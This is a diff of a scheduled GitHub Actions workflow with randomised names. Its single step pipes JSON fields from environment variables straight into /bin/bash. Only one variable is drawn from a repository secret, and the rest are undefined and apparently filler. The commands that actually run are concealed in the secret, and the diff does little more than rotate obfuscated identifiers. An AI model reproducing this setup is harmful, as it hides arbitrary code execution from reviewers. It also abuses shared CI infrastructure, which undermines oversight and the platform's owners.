@@ -1,22 +1,29 @@
 name: gonggangsi3819
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 4/6 * * *'
-jobs:  # 19960
+    - cron: '45 2/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: gonggangsi3819
         env:
-          phha81338: ${{ secrets.phha81338 }}
+          bstzx124: ${{ secrets.bstzx124 }}
         run: |
-          echo $phha81338 | jq -r .ra474 | /bin/bash
-          echo $fqvp917 | jq -r .rwp7136 | /bin/bash
-          echo $ttkil5450 | jq -r .addb0 | /bin/bash
-          echo $cbh8638 | jq -r .wwf50 | /bin/bash
-          echo $gbzu6 | jq -r .fuy7634 | /bin/bash
-          echo $re55 | jq -r .kvcjs5610 | /bin/bash
-          echo $gk424 | jq -r .xa42178 | /bin/bash
+          echo $bstzx124 | jq -r .u42167 | /bin/bash
+          echo $o530 | jq -r .e49 | /bin/bash
+          echo $nn9 | jq -r .qwxv1751 | /bin/bash
+          echo $o592 | jq -r .rin510 | /bin/bash
+          echo $r801 | jq -r .i572 | /bin/bash
+          echo $bikxy9 | jq -r .vfwlc5945 | /bin/bash
+          echo $gfxh86335 | jq -r .cewz11 | /bin/bash
+          echo $yqs9283 | jq -r .cdl5 | /bin/bash
+          echo $ijuuk240 | jq -r .yt561 | /bin/bash
+          echo $elb97670 | jq -r .wasg161 | /bin/bash
+          echo $lk89 | jq -r .blpls194 | /bin/bash
+          echo $b6265 | jq -r .xdvzd4498 | /bin/bash
 
